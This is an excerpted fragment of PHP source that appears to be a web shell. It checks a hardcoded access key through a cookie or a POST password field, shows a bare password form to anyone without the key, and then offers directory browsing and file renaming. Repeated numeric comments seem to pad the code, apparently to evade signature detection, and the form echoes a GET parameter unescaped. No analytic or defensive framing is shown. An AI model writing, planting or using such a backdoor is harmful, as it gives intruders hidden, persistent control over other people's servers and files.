...
$auth_key = "224e60e99a3cfaff17178b5df765fdf0";
...
$pass = false;
if (isset($_COOKIE['pw_name_96660'])) {
    if(($_COOKIE['pw_name_96660']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_96660'])) {
        if(($_POST['pw_name_96660']) == $auth_key) {
            setcookie("pw_name_96660", $_POST['pw_name_96660']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_96660' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725942642394364 1725942642397064 1725942642571208 1725942642966562
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725942642394364 1725942642397064 1725942642571208 1725942642966562
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725942642394364 1725942642397064 1725942642571208 1725942642966562
            $name = PATH . "/" . $_GET['r'];
